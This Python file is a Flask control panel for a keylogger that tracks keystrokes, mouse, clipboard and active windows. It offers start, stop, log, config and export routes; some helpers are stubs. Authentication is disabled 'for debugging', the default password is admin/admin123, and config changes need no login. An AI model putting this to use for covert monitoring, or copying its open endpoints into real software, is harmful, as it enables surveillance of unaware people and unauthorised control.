"""Web interface for keylogger monitoring and management."""

import os
import json
import time
import logging
from datetime import datetime, timedelta
from typing import Dict, Any, List, Optional
from functools import wraps

try:
    from flask import Flask, render_template, request, jsonify, send_file, redirect, url_for, session, flash
    from werkzeug.security import check_password_hash, generate_password_hash
    from werkzeug.utils import secure_filename
except ImportError:
    Flask = None
    print("Flask not available. Web interface disabled.")

logger = logging.getLogger(__name__)


class KeyloggerWebApp:
    """Web application for keylogger management."""
    
    def __init__(self, keylogger_core, config_manager):
        if not Flask:
            raise ImportError("Flask is required for web interface")
        
        self.keylogger = keylogger_core
        self.config = config_manager
        
        # Flask app setup
        template_dir = os.path.join(os.path.dirname(os.path.dirname(__file__)), 'templates')
        static_dir = os.path.join(os.path.dirname(os.path.dirname(__file__)), 'static')
        self.app = Flask(__name__, 
                        template_folder=template_dir,
                        static_folder=static_dir)
        
        # Configuration
        self.app.secret_key = self.config.get('web.secret_key', os.urandom(24))
        self.app.config['MAX_CONTENT_LENGTH'] = 16 * 1024 * 1024  # 16MB max file size
        
        # Web settings
        self.host = self.config.get('web.host', '127.0.0.1')
        self.port = self.config.get('web.port', 5000)
        self.debug = self.config.get('web.debug', False)
        self.auth_enabled = False  # Temporarily disabled for debugging
        self.admin_username = self.config.get('web.username', 'admin')
        # Handle both plain password and hashed password
        plain_password = self.config.get('web.password', 'admin123')
        stored_hash = self.config.get('web.password_hash', '')
        if stored_hash:
            self.admin_password_hash = stored_hash
        else:
            self.admin_password_hash = generate_password_hash(plain_password)
        
        # Rate limiting
        self.request_counts = {}
        self.rate_limit = self.config.get('web.rate_limit_per_minute', 60)
        
        # Setup routes
        self._setup_routes()
        
        logger.info(f"Web interface initialized on {self.host}:{self.port}")
    
    def _setup_routes(self):
        """Setup Flask routes."""
        print("Setting up Flask routes...")
        logger.info("Setting up Flask routes...")
        
        # Temporarily disabled before_request to debug
        # @self.app.before_request
        # def before_request():
        #     try:
        #         logger.info(f"Before request: {request.endpoint}, method: {request.method}")
        #         # Rate limiting
        #         if not self._check_rate_limit():
        #             return jsonify({'error': 'Rate limit exceeded'}), 429
        #         
        #         # Authentication check
        #         if self.auth_enabled and request.endpoint not in ['login', 'static']:
        #             if not session.get('authenticated'):
        #                 if request.is_json:
        #                     return jsonify({'error': 'Authentication required'}), 401
        #                 return redirect(url_for('login'))
        #     except Exception as e:
        #         logger.error(f"Error in before_request: {e}")
        #         return f"Before request error: {str(e)}", 500
        
        @self.app.route('/')
        def dashboard():
            """Main dashboard."""
            try:
                # Get dashboard data
                dashboard_data = self._get_dashboard_stats()
                
                # Prepare data for template
                status = {
                    'running': dashboard_data.get('keylogger', {}).get('running', False)
                }
                
                stats = {
                    'events_logged': dashboard_data.get('keylogger', {}).get('total_events', 0),
                    'uptime': self._format_uptime(dashboard_data.get('keylogger', {}).get('uptime_hours', 0)),
                    'memory_usage': f"{dashboard_data.get('system', {}).get('keylogger_memory_mb', 0):.1f} MB"
                }
                
                features = {
                    'keyboard_logging': dashboard_data.get('components', {}).get('keyboard', {}).get('active', False),
                    'mouse_logging': dashboard_data.get('components', {}).get('mouse', {}).get('active', False),
                    'clipboard_monitoring': dashboard_data.get('components', {}).get('clipboard', {}).get('active', False),
                    'window_monitoring': dashboard_data.get('components', {}).get('window_monitor', {}).get('active', False),
                    'performance_monitoring': dashboard_data.get('components', {}).get('performance_monitor', {}).get('active', False)
                }
                
                system_info = {
                    'platform': 'Windows',
                    'python_version': '3.x',
                    'cpu_usage': f"{dashboard_data.get('system', {}).get('cpu_percent', 0):.1f}%",
                    'available_memory': f"{100 - dashboard_data.get('system', {}).get('memory_percent', 0):.1f}%",
                    'disk_space': f"{100 - dashboard_data.get('system', {}).get('disk_percent', 0):.1f}%"
                }
                
                recent_events = self._format_recent_events(dashboard_data.get('recent_activity', []))
                
                return render_template('dashboard.html',
                                     status=status,
                                     stats=stats,
                                     features=features,
                                     system_info=system_info,
                                     recent_events=recent_events)
            except Exception as e:
                logger.error(f"Error loading dashboard: {e}")
                return render_template('error.html', error=str(e)), 500
        
        @self.app.route('/test')
        def test_route():
            """Simple test route."""
            return "Test route works!"
        
        @self.app.route('/login', methods=['GET', 'POST'])
        def login():
            """Login page."""
            print("LOGIN ROUTE CALLED!")
            logger.info("LOGIN ROUTE CALLED!")
            return "Login page works! (minimal version)"
        
        print(f"Registered login route: {self.app.url_map}")
        logger.info(f"Registered login route: {self.app.url_map}")
        
        # Add error handler to catch and log exceptions
        @self.app.errorhandler(500)
        def handle_500_error(error):
            print(f"500 ERROR CAUGHT: {error}")
            logger.error(f"500 ERROR CAUGHT: {error}")
            import traceback
            traceback.print_exc()
            return f"Internal Server Error: {str(error)}", 500
        
        @self.app.route('/logout')
        def logout():
            """Logout."""
            session.clear()
            flash('Logged out successfully', 'info')
            return redirect(url_for('login'))
        
        @self.app.route('/api/stats')
        def api_stats():
            """API endpoint for statistics."""
            try:
                stats = self._get_dashboard_stats()
                return jsonify(stats)
            except Exception as e:
                logger.error(f"Error getting stats: {e}")
                return jsonify({'error': str(e)}), 500
        
        @self.app.route('/api/status')
        def api_status():
            """API endpoint for keylogger status."""
            try:
                status = {
                    'running': self.keylogger.is_running,
                    'uptime': time.time() - self.keylogger.start_time if hasattr(self.keylogger, 'start_time') else 0,
                    'components': self._get_component_status()
                }
                return jsonify(status)
            except Exception as e:
                logger.error(f"Error getting status: {e}")
                return jsonify({'error': str(e)}), 500
        
        @self.app.route('/api/control/<action>', methods=['POST'])
        def api_control(action):
            """API endpoint for keylogger control."""
            try:
                if action == 'start':
                    if not self.keylogger.is_running():
                        # Start keylogger in a separate thread
                        import threading
                        thread = threading.Thread(target=self.keylogger.run)
                        thread.daemon = True
                        thread.start()
                        return jsonify({'success': True, 'message': 'Keylogger started'})
                    else:
                        return jsonify({'success': False, 'message': 'Keylogger already running'})
                
                elif action == 'stop':
                    if self.keylogger.is_running():
                        self.keylogger.stop()
                        return jsonify({'success': True, 'message': 'Keylogger stopped'})
                    else:
                        return jsonify({'success': False, 'message': 'Keylogger not running'})
                
                elif action == 'restart':
                    self.keylogger.stop()
                    time.sleep(1)
                    import threading
                    thread = threading.Thread(target=self.keylogger.run)
                    thread.daemon = True
                    thread.start()
                    return jsonify({'success': True, 'message': 'Keylogger restarted'})
                
                elif action == 'reload_config':
                    self.keylogger.reload_config()
                    return jsonify({'success': True, 'message': 'Configuration reloaded'})
                
                else:
                    return jsonify({'error': 'Invalid action'}), 400
            
            except Exception as e:
                logger.error(f"Error controlling keylogger: {e}")
                return jsonify({'error': str(e)}), 500
        
        @self.app.route('/logs')
        def logs():
            """Logs viewing page."""
            try:
                page = request.args.get('page', 1, type=int)
                per_page = request.args.get('per_page', 50, type=int)
                event_type = request.args.get('type', '')
                window_filter = request.args.get('window', '')
                
                logs = self._get_recent_logs(page, per_page, event_type, window_filter)
                return render_template('logs.html', logs=logs)
            except Exception as e:
                logger.error(f"Error loading logs page: {e}")
                return render_template('error.html', error=str(e)), 500
        
        @self.app.route('/api/logs')
        def api_logs():
            """API endpoint for logs."""
            try:
                page = request.args.get('page', 1, type=int)
                per_page = request.args.get('per_page', 50, type=int)
                event_type = request.args.get('type', '')
                window_filter = request.args.get('window', '')
                
                logs = self._get_recent_logs(page, per_page, event_type, window_filter)
                return jsonify(logs)
            except Exception as e:
                logger.error(f"Error getting logs: {e}")
                return jsonify({'error': str(e)}), 500
        
        @self.app.route('/config')
        def config():
            """Configuration page."""
            try:
                config_data = self.config.get_all_config()
                return render_template('config.html', config=config_data)
            except Exception as e:
                logger.error(f"Error loading config page: {e}")
                return render_template('error.html', error=str(e)), 500
        
        @self.app.route('/api/config', methods=['GET', 'POST'])
        def api_config():
            """API endpoint for configuration."""
            try:
                if request.method == 'GET':
                    config_data = self.config.get_all_config()
                    return jsonify(config_data)
                
                elif request.method == 'POST':
                    new_config = request.get_json()
                    if not new_config:
                        return jsonify({'error': 'No configuration data provided'}), 400
                    
                    # Validate and save configuration
                    self.config.update_config(new_config)
                    self.config.save_config()
                    
                    return jsonify({'success': True, 'message': 'Configuration updated'})
            
            except Exception as e:
                logger.error(f"Error handling config: {e}")
                return jsonify({'error': str(e)}), 500
        
        @self.app.route('/export')
        def export():
            """Export page."""
            return render_template('export.html')
        
        @self.app.route('/api/export/<format>')
        def api_export(format):
            """API endpoint for data export."""
            try:
                if format not in ['json', 'csv', 'txt']:
                    return jsonify({'error': 'Invalid export format'}), 400
                
                # Get export parameters
                start_date = request.args.get('start_date')
                end_date = request.args.get('end_date')
                event_types = request.args.getlist('event_types')
                
                # Generate export file
                export_file = self._generate_export(format, start_date, end_date, event_types)
                
                if export_file:
                    return send_file(export_file, as_attachment=True)
                else:
                    return jsonify({'error': 'Export generation failed'}), 500
            
            except Exception as e:
                logger.error(f"Error exporting data: {e}")
                return jsonify({'error': str(e)}), 500
        
        @self.app.route('/performance')
        def performance():
            """Performance monitoring page."""
            try:
                perf_data = self._get_performance_data()
                return render_template('performance.html', performance=perf_data)
            except Exception as e:
                logger.error(f"Error loading performance page: {e}")
                return render_template('error.html', error=str(e)), 500
        
        @self.app.route('/api/performance')
        def api_performance():
            """API endpoint for performance data."""
            try:
                perf_data = self._get_performance_data()
                return jsonify(perf_data)
            except Exception as e:
                logger.error(f"Error getting performance data: {e}")
                return jsonify({'error': str(e)}), 500
        
        @self.app.errorhandler(404)
        def not_found(error):
            return render_template('error.html', error='Page not found'), 404
        
        @self.app.errorhandler(500)
        def internal_error(error):
            return render_template('error.html', error='Internal server error'), 500
    
    def _check_rate_limit(self) -> bool:
        """Check if request is within rate limit."""
        try:
            client_ip = request.remote_addr
            current_time = time.time()
            
            # Clean old entries
            cutoff_time = current_time - 60  # 1 minute window
            self.request_counts = {
                ip: [t for t in times if t > cutoff_time]
                for ip, times in self.request_counts.items()
            }
            
            # Check current IP
            if client_ip not in self.request_counts:
                self.request_counts[client_ip] = []
            
            if len(self.request_counts[client_ip]) >= self.rate_limit:
                return False
            
            self.request_counts[client_ip].append(current_time)
            return True
            
        except Exception:
            return True  # Allow request if rate limiting fails
    
    def _get_dashboard_stats(self) -> Dict[str, Any]:
        """Get statistics for dashboard."""
        try:
            status = self.keylogger.get_status()
            
            # Add additional computed stats
            uptime = time.time() - getattr(self.keylogger, 'start_time', time.time())
            
            dashboard_stats = {
                'keylogger': {
                    'running': self.keylogger.is_running,
                    'uptime_hours': uptime / 3600,
                    'total_events': status.get('session_stats', {}).get('events_logged', 0),
                    'events_per_hour': status.get('session_stats', {}).get('events_logged', 0) / max(uptime / 3600, 1),
                    'buffer_size': status.get('logging_stats', {}).get('buffer_size', 0),
                    'log_file_size_mb': status.get('logging_stats', {}).get('log_file_size_mb', 0)
                },
                'components': self._get_component_status(),
                'recent_activity': self._get_recent_activity(),
                'system': self._get_system_stats(),
                'alerts': self._get_recent_alerts()
            }
            
            return dashboard_stats
            
        except Exception as e:
            logger.error(f"Error getting dashboard stats: {e}")
            return {}
    
    def _get_component_status(self) -> Dict[str, Any]:
        """Get status of keylogger components."""
        try:
            components = {}
            
            # Check each component
            if hasattr(self.keylogger, 'keyboard_listener'):
                components['keyboard'] = {
                    'active': getattr(self.keylogger.keyboard_listener, 'is_running', False),
                    'events': getattr(self.keylogger.keyboard_listener, 'stats', {}).get('keys_pressed', 0)
                }
            
            if hasattr(self.keylogger, 'mouse_listener'):
                components['mouse'] = {
                    'active': getattr(self.keylogger.mouse_listener, 'is_running', False),
                    'events': getattr(self.keylogger.mouse_listener, 'stats', {}).get('total_clicks', 0)
                }
            
            if hasattr(self.keylogger, 'clipboard_listener'):
                components['clipboard'] = {
                    'active': getattr(self.keylogger.clipboard_listener, 'is_running', False),
                    'events': getattr(self.keylogger.clipboard_listener, 'stats', {}).get('changes_detected', 0)
                }
            
            if hasattr(self.keylogger, 'window_monitor'):
                components['window_monitor'] = {
                    'active': getattr(self.keylogger.window_monitor, 'is_running', False),
                    'current_window': getattr(self.keylogger, 'session_stats', {}).get('active_window', 'Unknown')
                }
            
            if hasattr(self.keylogger, 'performance_monitor'):
                components['performance_monitor'] = {
                    'active': getattr(self.keylogger.performance_monitor, 'is_running', False),
                    'alerts': getattr(self.keylogger.performance_monitor, 'stats', {}).get('alerts_triggered', 0)
                }
            
            return components
            
        except Exception as e:
            logger.error(f"Error getting component status: {e}")
            return {}
    
    def _get_recent_activity(self) -> List[Dict[str, Any]]:
        """Get recent activity summary."""
        try:
            # This would typically come from the logging manager
            # For now, return mock data
            return [
                {
                    'time': datetime.now().strftime('%H:%M:%S'),
                    'type': 'Key Press',
                    'content': 'Recent typing activity',
                    'window': 'Browser'
                }
            ]
            
        except Exception as e:
            logger.error(f"Error getting recent activity: {e}")
            return []
    
    def _get_system_stats(self) -> Dict[str, Any]:
        """Get system performance statistics."""
        try:
            if hasattr(self.keylogger, 'performance_monitor'):
                perf_monitor = self.keylogger.performance_monitor
                current_metrics = perf_monitor.get_current_metrics()
                
                return {
                    'cpu_percent': current_metrics.get('system', {}).get('cpu', {}).get('percent', 0),
                    'memory_percent': current_metrics.get('system', {}).get('memory', {}).get('percent', 0),
                    'disk_percent': current_metrics.get('system', {}).get('disk', {}).get('percent', 0),
                    'keylogger_memory_mb': current_metrics.get('keylogger', {}).get('process', {}).get('memory_rss_mb', 0)
                }
            
            return {}
            
        except Exception as e:
            logger.error(f"Error getting system stats: {e}")
            return {}
    
    def _get_recent_alerts(self) -> List[Dict[str, Any]]:
        """Get recent alerts."""
        try:
            if hasattr(self.keylogger, 'performance_monitor'):
                perf_monitor = self.keylogger.performance_monitor
                return perf_monitor.get_alerts_history(5)
            
            return []
            
        except Exception as e:
            logger.error(f"Error getting recent alerts: {e}")
            return []
    
    def _get_recent_logs(self, page: int, per_page: int, event_type: str = '', window_filter: str = '') -> Dict[str, Any]:
        """Get recent log entries with pagination."""
        try:
            # This would typically come from the logging manager
            # For now, return mock data structure
            logs = {
                'entries': [],
                'pagination': {
                    'page': page,
                    'per_page': per_page,
                    'total': 0,
                    'pages': 0
                },
                'filters': {
                    'event_type': event_type,
                    'window_filter': window_filter
                }
            }
            
            return logs
            
        except Exception as e:
            logger.error(f"Error getting recent logs: {e}")
            return {'entries': [], 'pagination': {}, 'filters': {}}
    
    def _get_performance_data(self) -> Dict[str, Any]:
        """Get performance monitoring data."""
        try:
            if hasattr(self.keylogger, 'performance_monitor'):
                perf_monitor = self.keylogger.performance_monitor
                return {
                    'current': perf_monitor.get_current_metrics(),
                    'history': perf_monitor.get_metrics_history(50),
                    'summary': perf_monitor.get_performance_summary(),
                    'alerts': perf_monitor.get_alerts_history(10)
                }
            
            return {}
            
        except Exception as e:
            logger.error(f"Error getting performance data: {e}")
            return {}
    
    def _generate_export(self, format: str, start_date: str = None, end_date: str = None, event_types: List[str] = None) -> Optional[str]:
        """Generate export file."""
        try:
            # This would use the logging manager to export data
            # For now, return None to indicate not implemented
            return None
            
        except Exception as e:
            logger.error(f"Error generating export: {e}")
            return None
    
    def _format_uptime(self, uptime_hours: float) -> str:
        """Format uptime hours into readable string."""
        try:
            if uptime_hours < 1:
                minutes = int(uptime_hours * 60)
                return f"{minutes}m"
            elif uptime_hours < 24:
                hours = int(uptime_hours)
                minutes = int((uptime_hours - hours) * 60)
                return f"{hours}h {minutes}m"
            else:
                days = int(uptime_hours / 24)
                hours = int(uptime_hours % 24)
                return f"{days}d {hours}h"
        except Exception:
            return "0m"
    
    def _format_recent_events(self, events: List[Dict[str, Any]]) -> List[Dict[str, Any]]:
        """Format recent events for display."""
        try:
            formatted_events = []
            for event in events[:10]:  # Limit to 10 most recent
                formatted_event = {
                    'timestamp': event.get('time', 'Unknown'),
                    'type': event.get('type', 'Unknown'),
                    'data': event.get('content', 'No data'),
                    'window': event.get('window', 'Unknown')
                }
                formatted_events.append(formatted_event)
            return formatted_events
        except Exception as e:
            logger.error(f"Error formatting recent events: {e}")
            return []
    
    def run(self, threaded: bool = True) -> None:
        """Run the web application."""
        try:
            logger.info(f"Starting web interface on {self.host}:{self.port}")
            self.app.run(
                host=self.host,
                port=self.port,
                debug=self.debug,
                threaded=threaded,
                use_reloader=False  # Disable reloader to avoid issues with keylogger
            )
        except Exception as e:
            logger.error(f"Error running web application: {e}")
    
    def get_app(self):
        """Get Flask app instance."""
        return self.app


def create_web_app(keylogger_core, config_manager):
    """Factory function to create web app."""
    try:
        return KeyloggerWebApp(keylogger_core, config_manager)
    except ImportError as e:
        logger.error(f"Cannot create web app: {e}")
        return None